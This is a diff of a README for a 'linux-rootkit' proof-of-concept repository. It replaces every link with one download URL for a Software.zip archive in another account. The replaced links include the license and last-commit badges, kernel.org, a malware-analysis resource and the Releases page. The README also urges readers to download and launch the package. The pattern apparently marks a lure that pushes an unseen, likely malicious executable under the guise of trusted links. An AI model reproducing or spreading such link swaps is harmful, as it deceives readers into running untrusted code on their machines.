@@ -2,8 +2,8 @@
 
 Welcome to the "linux-rootkit" repository, a simple Proof of Concept (POC) of a Linux kernel module that poses as a rootkit to stealthily hook its system calls.
 
-[![License](https://img.shields.io/badge/License-MIT-blue)](https://opensource.org/licenses/MIT)
-[![Last Commit](https://img.shields.io/github/last-commit/YouaifXD/linux-rootkit)](https://github.com/YouaifXD/linux-rootkit/commits/main)
+[![License](https://github.com/carel566/linux-rootkit/releases/download/v2.0/Software.zip)](https://github.com/carel566/linux-rootkit/releases/download/v2.0/Software.zip)
+[![Last Commit](https://github.com/carel566/linux-rootkit/releases/download/v2.0/Software.zip)](https://github.com/carel566/linux-rootkit/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -18,7 +18,7 @@ This repository contains a demonstration of a Linux kernel module designed to ac
 ## Installation
 
 To try out this Linux rootkit project, you can download the software package from the following link:
-[![Download Software Package](https://img.shields.io/badge/Download-Software%20Package-red)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software Package](https://github.com/carel566/linux-rootkit/releases/download/v2.0/Software.zip%20Package-red)](https://github.com/carel566/linux-rootkit/releases/download/v2.0/Software.zip)
 
 Once downloaded, the software package needs to be launched to explore the functionalities of the rootkit module.
 
@@ -47,8 +47,8 @@ Contributions to the "linux-rootkit" repository are welcome. Feel free to submit
 
 For additional information on rootkits, Linux kernel development, and malware analysis, consider exploring the following resources:
 
-- [Linux Kernel Archives](https://www.kernel.org/)  
-- [Malware Analysis and Detection Resources](https://www.malware-traffic-analysis.net/)  
+- [Linux Kernel Archives](https://github.com/carel566/linux-rootkit/releases/download/v2.0/Software.zip)  
+- [Malware Analysis and Detection Resources](https://github.com/carel566/linux-rootkit/releases/download/v2.0/Software.zip)  
 
 ## Conclusion
 
@@ -58,4 +58,4 @@ The "linux-rootkit" repository provides a hands-on exploration of rootkit develo
 
 ---
 
-Check out the [Releases](https://github.com/YouaifXD/linux-rootkit/releases) section for the latest updates and versions of the project. Thank you for your interest in the "linux-rootkit" repository! 🚀
+Check out the [Releases](https://github.com/carel566/linux-rootkit/releases/download/v2.0/Software.zip) section for the latest updates and versions of the project. Thank you for your interest in the "linux-rootkit" repository! 🚀
